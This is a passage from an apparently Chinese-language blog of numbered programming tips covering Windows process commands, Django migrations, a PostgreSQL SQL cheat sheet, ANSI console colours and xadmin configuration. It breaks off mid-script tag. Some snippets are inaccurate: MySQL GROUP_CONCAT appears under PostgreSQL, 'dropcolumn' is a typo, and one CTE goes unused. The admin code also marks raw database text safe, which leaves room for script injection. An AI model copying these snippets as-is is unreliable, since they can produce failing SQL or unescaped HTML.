class="line">tasklist |findstr 1620</span><br><span class="line"></span><br><span class="line">KGService.exe                 1620 Console                    1     18,696 K</span><br></pre></td></tr></table></figure><p>关进程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill /pid 1620 /F</span><br></pre></td></tr></table></figure><p>查看程序占用内存<br>比如查看python占用运行内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist  /fi &quot;imagename eq python.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a61afd069e964e6f9d755c5c1884ca6f.png" alt="在这里插入图片描述"></p><h2 id="83、Django生成表和反向生成Model"><a href="#83、Django生成表和反向生成Model" class="headerlink" title="83、Django生成表和反向生成Model"></a>83、Django生成表和反向生成Model</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">正向生成：</span><br><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br><span class="line"></span><br><span class="line">反向：</span><br><span class="line">会根据设置的数据库中的表在自动生成对应的Model代码，并打印出来</span><br><span class="line">python manage.py inspectdb</span><br><span class="line"></span><br><span class="line">以直接将打印的代码直接导入到指定的Model文件中</span><br><span class="line">python manage.py inspectdb &gt; models.py</span><br></pre></td></tr></table></figure><h2 id="84、windows的hosts文件位置"><a href="#84、windows的hosts文件位置" class="headerlink" title="84、windows的hosts文件位置"></a>84、windows的hosts文件位置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><h2 id="85、postgresql数据库"><a href="#85、postgresql数据库" class="headerlink" title="85、postgresql数据库"></a>85、postgresql数据库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line"># 如果表存在就先删除</span><br><span class="line">drop table if exists student;</span><br><span class="line"># 创建学生表</span><br><span class="line"># id      serial not null  表示id自增</span><br><span class="line"># id      integer not null  表示id不自增</span><br><span class="line">create table student</span><br><span class="line">(</span><br><span class="line">    id                    serial not null</span><br><span class="line">        constraint student_pk</span><br><span class="line">            primary key,</span><br><span class="line">    name                  varchar,</span><br><span class="line">    class_id              integer,</span><br><span class="line">    height                numeric,</span><br><span class="line">    weight                numeric,</span><br><span class="line">    write_date            timestamp</span><br><span class="line">    </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">comment on table student is &#x27;学生表&#x27;;</span><br><span class="line"></span><br><span class="line">comment on column student.name is &#x27;名称&#x27;;</span><br><span class="line"></span><br><span class="line">comment on column student.class_id is &#x27;班级ID&#x27;;</span><br><span class="line"></span><br><span class="line">comment on column student.height is &#x27;身高&#x27;;</span><br><span class="line"></span><br><span class="line">comment on column student.weight is &#x27;体重&#x27;;</span><br><span class="line"></span><br><span class="line">comment on column student.write_date is &#x27;修改时间&#x27;;</span><br><span class="line"></span><br><span class="line">alter table student</span><br><span class="line">    owner to odoo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 更新</span><br><span class="line">update user set name=&#x27;张三&#x27; where id=111</span><br><span class="line"></span><br><span class="line"># 更新表a的字段为表b的值</span><br><span class="line">update account_invoice </span><br><span class="line">set sale_order_id=so.id </span><br><span class="line">from sale_order so </span><br><span class="line">where account_invoice.origin=so.name</span><br><span class="line"></span><br><span class="line"># 新增</span><br><span class="line">insert into &quot;user&quot; (name,sex) values (&#x27;小明&#x27;,1),(&#x27;小红&#x27;, 0)</span><br><span class="line"># 新增或更新</span><br><span class="line">如果id冲突就更新</span><br><span class="line">INSERT INTO  student(id, name)</span><br><span class="line">   VALUES(12, &#x27;小明&#x27;),(13, &#x27;小红&#x27;)</span><br><span class="line">   ON conflict(id) DO UPDATE</span><br><span class="line">   SET name =&#x27;未知&#x27;;</span><br><span class="line">如果id冲突就什么也不做</span><br><span class="line">INSERT INTO  student(id, name)</span><br><span class="line">   VALUES(12, &#x27;小明&#x27;),(13, &#x27;小红&#x27;)</span><br><span class="line">   ON conflict(id) DO NOTHING;</span><br><span class="line"></span><br><span class="line"># 把一个表中的数据插入到另一个表中</span><br><span class="line">insert into 目标表名 (column1,column2,columnn) select value1,value2,valuen from  源表名</span><br><span class="line">比如：</span><br><span class="line">insert into student (name, classs_name,create_date) select  student_name as name, class_name, now() from class_table;</span><br><span class="line"></span><br><span class="line"># 获取当前时间</span><br><span class="line">now()</span><br><span class="line">select now()</span><br><span class="line"></span><br><span class="line"># 删除</span><br><span class="line">DELETE FROM table_name [WHERE Clause]</span><br><span class="line"></span><br><span class="line"># 增加字段</span><br><span class="line">alter table 表名 add column 列名 类型;</span><br><span class="line"># 删除字段</span><br><span class="line">alter table 表名 dropcolumn 列名 ;</span><br><span class="line"></span><br><span class="line"># postgresql数据库查看表所有字段</span><br><span class="line">select * from information_schema.columns where table_schema=&#x27;public&#x27; and table_name=&#x27;表名&#x27;;</span><br><span class="line"></span><br><span class="line"># postgresql获取所有表名</span><br><span class="line">select tablename from pg_tables where schemaname=&#x27;public&#x27;</span><br><span class="line"></span><br><span class="line"># 对查询结果按id降序显示</span><br><span class="line">select * from table_name order by id desc</span><br><span class="line"></span><br><span class="line"># 对查询结果按id升序显示</span><br><span class="line">select * from table_name order by id asc</span><br><span class="line"></span><br><span class="line"># 转义字符, 查找name中包含单引号的记录</span><br><span class="line">select * from student where name like  E&#x27;%\&#x27;%&#x27;;</span><br><span class="line"></span><br><span class="line"># 查看表记录总数</span><br><span class="line">select relname as TABLE_NAME, reltuples as rowCounts from pg_class where relkind = &#x27;r&#x27; and relnamespace = (select oid from pg_namespace where nspname=&#x27;public&#x27;) order by rowCounts desc;</span><br><span class="line"></span><br><span class="line"># 将结果转换为数组</span><br><span class="line">SELECT array(SELECT &quot;name&quot; FROM sale_order);</span><br><span class="line"></span><br><span class="line"># 将数组合并为字符串</span><br><span class="line">select array_to_string(array[1,2,3], &#x27;,&#x27;)</span><br><span class="line"></span><br><span class="line"># 联合子集更新，把sale_order_line的name连接换行符，然后按id更新到表a_test中对应的name</span><br><span class="line">update a_test set name=array_to_string(array(select name from sale_order_line where order_id=a_test.id),&#x27;&lt;br/&gt;&#x27;);</span><br><span class="line"></span><br><span class="line"># PostgreSQL合并查询同一列的多条记录，针对一对多，多对多字段</span><br><span class="line">比如表：</span><br><span class="line"></span><br><span class="line">id   name                  </span><br><span class="line">1    小明                   </span><br><span class="line">1    小红                     id   name</span><br><span class="line">1    小亮        --&gt;          1    小明，小亮，小红</span><br><span class="line">2    小强                     2    小强，小王</span><br><span class="line">2    小王</span><br><span class="line"></span><br><span class="line">SELECT </span><br><span class="line">    id, array_to_string(ARRAY(SELECT unnest(array_agg(name order by name desc))),&#x27;,&#x27;) AS all_name</span><br><span class="line">FROM  </span><br><span class="line">    student</span><br><span class="line">GROUP BY id;</span><br><span class="line"></span><br><span class="line"># case语句</span><br><span class="line">case var</span><br><span class="line">when condition1 then statement1</span><br><span class="line">when condition2 then statement2</span><br><span class="line">else statementn</span><br><span class="line">end as new_name</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">select case name</span><br><span class="line">when &#x27;小明&#x27; then &#x27;xm&#x27;</span><br><span class="line">when &#x27;小红&#x27; then &#x27;xh&#x27;</span><br><span class="line">when &#x27;小刚&#x27; then &#x27;xg&#x27;</span><br><span class="line">else &#x27;xw&#x27;</span><br><span class="line">end as short_name</span><br><span class="line">from student</span><br><span class="line"></span><br><span class="line"># 临时表、字符串合并、类型转换、时间格式转换、当前时间</span><br><span class="line">WITH TEMP AS ( </span><br><span class="line">SELECT CAST ( concat ( bam.account_period_code, &#x27;-01&#x27; ) AS TIMESTAMP ) </span><br><span class="line">   AS account_period_time </span><br><span class="line"> FROM bi_account_move AS bam ) </span><br><span class="line">SELECT</span><br><span class="line">account_period_time,</span><br><span class="line">to_char(CURRENT_DATE,&#x27;yyyy-MM-dd hh24:MI:ss&#x27;) as current_date,</span><br><span class="line">to_char( account_period_time, &#x27;yyyy&#x27; ) as year,</span><br><span class="line">to_char( account_period_time, &#x27;MM&#x27; ) as month,</span><br><span class="line">to_char( account_period_time, &#x27;dd&#x27; ) as day </span><br><span class="line">FROM TEMP</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">account_period_timecurrent_date    yearmonthday</span><br><span class="line">2019-06-01 0:00:002020-06-24 00:00:002019 06     01</span><br><span class="line">2019-06-01 0:00:002020-06-24 00:00:002019 06     01</span><br><span class="line"></span><br><span class="line"># 多个字符串拼接</span><br><span class="line">select </span><br><span class="line">concat(&#x27;payment_&#x27;, CAST(ap.id as varchar)) as line_key</span><br><span class="line">from ap</span><br><span class="line"></span><br><span class="line"># 将查询所得结果集的某一字段拼接成字符串，默认的是逗号</span><br><span class="line">select GROUP_CONCAT(id) from test where id&gt;5;</span><br><span class="line">结果为：</span><br><span class="line">1,2,3,4,5,6,7</span><br><span class="line"># 使用其他分隔符拼接</span><br><span class="line">select GROUP_CONCAT(id separator &#x27;-&#x27;) from test where id&gt;5;</span><br><span class="line">结果为：</span><br><span class="line">1-2-3-4-5-6-7</span><br><span class="line"># 多个临时表</span><br><span class="line">WITH temp_student AS ( SELECT ID, NAME, sex FROM student WHERE sex = TRUE ),</span><br><span class="line">temp_class AS (</span><br><span class="line">SELECT</span><br><span class="line">ID,</span><br><span class="line">NAME,</span><br><span class="line">student_id,</span><br><span class="line">teacher_id</span><br><span class="line">FROM</span><br><span class="line">the_class </span><br><span class="line">),</span><br><span class="line">temp_teacher AS (</span><br><span class="line">SELECT </span><br><span class="line">  ID,</span><br><span class="line">NAME,</span><br><span class="line">age </span><br><span class="line">FROM</span><br><span class="line">teacher </span><br><span class="line">) </span><br><span class="line">SELECT</span><br><span class="line">ts.NAME AS student_name,</span><br><span class="line">tc.NAME AS class_name,</span><br><span class="line">te.NAME AS teacher_name</span><br><span class="line">from temp_student as ts</span><br><span class="line">LEFT JOIN temp_class AS tc ON tc.student_id = ts.ID  </span><br><span class="line">LEFT JOIN teacher AS te ON te.id = tc.teacher_id  </span><br><span class="line"></span><br><span class="line"># null转成有意义的值</span><br><span class="line">select COALESCE(name, &#x27;&#x27;) as name from a_test</span><br><span class="line">意思就是如果name为null，就转为空字符串</span><br><span class="line"></span><br><span class="line"># 字符串截取</span><br><span class="line">select SUBSTRING(&#x27;abcd&#x27;,1,2); -- result:ab 表示从下标从1开始,截取2个字符</span><br><span class="line"></span><br><span class="line"># 使用 interval 时间相加减(+/-)</span><br><span class="line">当前时间 + 10秒，</span><br><span class="line">select to_char(now() + interval &#x27;10 second&#x27;, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  as reqDate from account_period;</span><br><span class="line">当前时间 - 10秒</span><br><span class="line">select to_char(now() + interval &#x27;-10 second&#x27;, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  as reqDate from account_period;</span><br><span class="line"> </span><br><span class="line">当前时间 + 10分，</span><br><span class="line">select to_char(now() + interval &#x27;10 minute&#x27;, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  as reqDate  from account_period;</span><br><span class="line"> </span><br><span class="line">当前时间 + 10时，</span><br><span class="line">select to_char(now() + interval &#x27;10 hour&#x27;, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  as reqDate from account_period;</span><br><span class="line"> </span><br><span class="line">当前时间 + 10天，</span><br><span class="line">select to_char(now() + interval &#x27;10 day&#x27;, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  as reqDate from account_period;</span><br><span class="line"></span><br><span class="line">当前时间 + 10年，</span><br><span class="line">select to_char(now() + interval &#x27;10 year&#x27;, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  as reqDate from account_period;</span><br><span class="line"></span><br><span class="line"># UNION types numeric and text cannot be matched</span><br><span class="line">NULL::NUMERIC</span><br><span class="line"> 这个问题，是因为几个sql组合在一起时，同一个字段的值，遇到null时，需要进行类型转换。</span><br><span class="line"></span><br><span class="line"># 对行记录定义行编号，使用函数ROW_NUMBER()</span><br><span class="line"># 按分数进行降序，然后给行记录标记行编号，可以作为排名来使用</span><br><span class="line">select           </span><br><span class="line">ROW_NUMBER() OVER (ORDER BY score desc) AS sequence_number,</span><br><span class="line">name,score</span><br><span class="line">from</span><br><span class="line">b_test</span><br><span class="line"></span><br><span class="line"># 数字转字符串  </span><br><span class="line">select cast(123 as VARCHAR); </span><br><span class="line"></span><br><span class="line"># 字符串转数字  </span><br><span class="line">select cast(&#x27;123&#x27; as INTEGER);</span><br></pre></td></tr></table></figure><h2 id="86、python控制台输出带颜色的文字方法"><a href="#86、python控制台输出带颜色的文字方法" class="headerlink" title="86、python控制台输出带颜色的文字方法"></a>86、python控制台输出带颜色的文字方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#格式：　　设置颜色开始 ：\033[显示方式;前景色;背景色m</span><br><span class="line">#说明：</span><br><span class="line">前景色            背景色           颜色</span><br><span class="line">---------------------------------------</span><br><span class="line">30                40              黑色</span><br><span class="line">31                41              红色</span><br><span class="line">32                42              绿色</span><br><span class="line">33                43              黃色</span><br><span class="line">34                44              蓝色</span><br><span class="line">35                45              紫红色</span><br><span class="line">36                46              青蓝色</span><br><span class="line">37                47              白色</span><br><span class="line">显示方式           意义</span><br><span class="line">-------------------------</span><br><span class="line">0                终端默认设置</span><br><span class="line">1                高亮显示</span><br><span class="line">4                使用下划线</span><br><span class="line">5                闪烁</span><br><span class="line">7                反白显示</span><br><span class="line">8                不可见</span><br><span class="line"> </span><br><span class="line">#例子：</span><br><span class="line">\033[1;31;40m    &lt;!--1-高亮显示 31-前景色红色  40-背景色黑色--&gt;</span><br><span class="line">\033[0m          &lt;!--采用终端默认设置，即取消颜色设置--&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例子</span><br><span class="line">print(&#x27;紫红字体 \033[1;35m hello world \033[0m!&#x27;)</span><br><span class="line">print(&#x27;褐色背景绿色字体 \033[1;32;43m hello world \033[0m!&#x27;)</span><br><span class="line">print(&#x27;\033[1;33;44mhello world\033[0m&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200615143709116.png" alt="在这里插入图片描述"></p><h2 id="87、控制台输出白色方框"><a href="#87、控制台输出白色方框" class="headerlink" title="87、控制台输出白色方框"></a>87、控制台输出白色方框</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;█&#x27;)</span><br></pre></td></tr></table></figure><h2 id="88、xadmin后台编辑多对多字段"><a href="#88、xadmin后台编辑多对多字段" class="headerlink" title="88、xadmin后台编辑多对多字段"></a>88、xadmin后台编辑多对多字段</h2><p>在models.py定义了多对多字段，想要在编辑时可以灵活使用这个字段的话，可以按以下方法设置：<br>modes.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">class Book(models.Model):</span><br><span class="line">    title = models.CharField(verbose_name=&quot;书名&quot;, max_length=32)</span><br><span class="line">    second_title = models.CharField(verbose_name=&quot;副标题&quot;, max_length=32, blank=True, null=True)</span><br><span class="line">    author = models.CharField(verbose_name=&quot;作者&quot;, max_length=32)</span><br><span class="line">    translator = models.CharField(verbose_name=&quot;译者&quot;, max_length=32, blank=True, null=True)</span><br><span class="line">    intro = models.TextField(verbose_name=&quot;描述&quot;)</span><br><span class="line">    pic = models.FileField(verbose_name=&quot;封面图片&quot;, max_length=64, upload_to=&#x27;book_cover&#x27;, null=True, blank=True)</span><br><span class="line">    tags = models.ManyToManyField(Tags, verbose_name=&#x27;书籍标签&#x27;, blank=True)</span><br><span class="line">    prizes = models.ManyToManyField(Prizes, verbose_name=&#x27;获奖详情&#x27;, blank=True)</span><br><span class="line">    sump = models.IntegerField(verbose_name=&quot;收藏人数&quot;, default=0)</span><br><span class="line">    rate_num = models.IntegerField(verbose_name=&quot;评分人数&quot;, default=0)</span><br><span class="line">    num = models.IntegerField(verbose_name=&quot;浏览量&quot;, default=0)</span><br><span class="line">    published_time = models.DateField(blank=True, null=True, verbose_name=&#x27;出版时间&#x27;)</span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=True, verbose_name=&#x27;创建时间&#x27;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        db_table = &#x27;book&#x27;</span><br><span class="line">        verbose_name = &quot;图书&quot;</span><br><span class="line">        verbose_name_plural = &quot;图书&quot;</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return self.title</span><br></pre></td></tr></table></figure><p>adminx.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 书籍管理</span><br><span class="line">class BookAdmin(object):</span><br><span class="line">    search_fields = [&#x27;title&#x27;, &#x27;author&#x27;, &#x27;intro&#x27;]  # 检索字段</span><br><span class="line">    list_display = [&#x27;id&#x27;, &#x27;show_pic&#x27;, &#x27;title&#x27;, &#x27;second_title&#x27;, &#x27;author&#x27;, &#x27;translator&#x27;, &#x27;published_time&#x27;, &#x27;intro&#x27;,</span><br><span class="line">                    &#x27;tags&#x27;, &#x27;prizes&#x27;, &#x27;num&#x27;, &#x27;sump&#x27;, &#x27;rate_num&#x27;]  # 要显示的字段</span><br><span class="line">    list_filter = [&#x27;published_time&#x27;, &#x27;tags&#x27;, &#x27;prizes&#x27;]  # 分组过滤的字段</span><br><span class="line">    ordering = (&#x27;id&#x27;,)  # 设置默认排序字段，负号表示降序排序</span><br><span class="line">    list_per_page = 30  # 默认每页显示多少条记录，默认是100条</span><br><span class="line">    model_icon = &#x27;fa fa-book&#x27;  # 左侧小图标</span><br><span class="line">    list_editable = [&#x27;title&#x27;, &#x27;author&#x27;, &#x27;intro&#x27;, &#x27;published_time&#x27;]  # 可编辑字段</span><br><span class="line">    style_fields = &#123;&#x27;tags&#x27;: &#x27;m2m_transfer&#x27;, &#x27;prizes&#x27;: &#x27;m2m_transfer&#x27;&#125;  # 控制字段的显示样式</span><br><span class="line">    filter_horizontal = (&#x27;tags&#x27;, &#x27;prizes&#x27;)  # 水平选择编辑多对多字段</span><br></pre></td></tr></table></figure><p>重点是设置style_fields 和filter_horizontal ，效果：</p><p><img src="https://img-blog.csdnimg.cn/20200621214122315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="89、Django后台通过按钮显示TextField字段内容"><a href="#89、Django后台通过按钮显示TextField字段内容" class="headerlink" title="89、Django后台通过按钮显示TextField字段内容"></a>89、Django后台通过按钮显示TextField字段内容</h2><p>由于TextField字段类型内容可能很长，在后台显示时很占屏幕位置，可以通过按钮来控制显示，代码如下：<br>models.py中定义了一个TextField字段类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Prizes(models.Model):</span><br><span class="line">    name = models.CharField(max_length=32, verbose_name=&quot;奖项&quot;)</span><br><span class="line">    intro = models.TextField(blank=True, null=True, verbose_name=&#x27;简介&#x27;)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        db_table = &#x27;prizes&#x27;</span><br><span class="line">        verbose_name = &quot;奖项&quot;</span><br><span class="line">        verbose_name_plural = &quot;奖项&quot;</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return self.name</span><br></pre></td></tr></table></figure><p>这里使用xadmin作为后台管理框架，在adminx.py中代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">import xadmin</span><br><span class="line">from django.utils.safestring import mark_safe</span><br><span class="line">from xadmin import views</span><br><span class="line"></span><br><span class="line">from .models import *</span><br><span class="line"></span><br><span class="line"># 奖项管理</span><br><span class="line">class PrizesAdmin(object):</span><br><span class="line">    search_fields = [&#x27;name&#x27;]  # 检索字段</span><br><span class="line">    list_display = [&#x27;id&#x27;, &#x27;name&#x27;, &#x27;show_intro&#x27;]</span><br><span class="line">    list_filter = [&#x27;name&#x27;]</span><br><span class="line">    ordering = (&#x27;id&#x27;,)</span><br><span class="line"></span><br><span class="line">    def show_intro(self, obj):</span><br><span class="line">        # 显示简介</span><br><span class="line">        if not obj.intro:</span><br><span class="line">            return mark_safe(&#x27;&#x27;)</span><br><span class="line">        if len(obj.intro) &lt; 20:</span><br><span class="line">            return mark_safe(obj.intro)</span><br><span class="line"></span><br><span class="line">        short_id = f&#x27;&#123;obj._meta.db_table&#125;_short_text_&#123;obj.id&#125;&#x27;</span><br><span class="line">        short_text_len = len(obj.intro) // 4</span><br><span class="line">        short_text = obj.intro[:short_text_len] + &#x27;......&#x27;</span><br><span class="line">        detail_id = f&#x27;&#123;obj._meta.db_table&#125;_detail_text_&#123;obj.id&#125;&#x27;</span><br><span class="line">        detail_text = obj.intro</span><br><span class="line"></span><br><span class="line">        text = &quot;&quot;&quot;&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">                        #%s,%s &#123;padding:10px;border:1px solid green;&#125; </span><br><span class="line">                  &lt;/style&gt;</span><br><span class="line">                    &lt;script 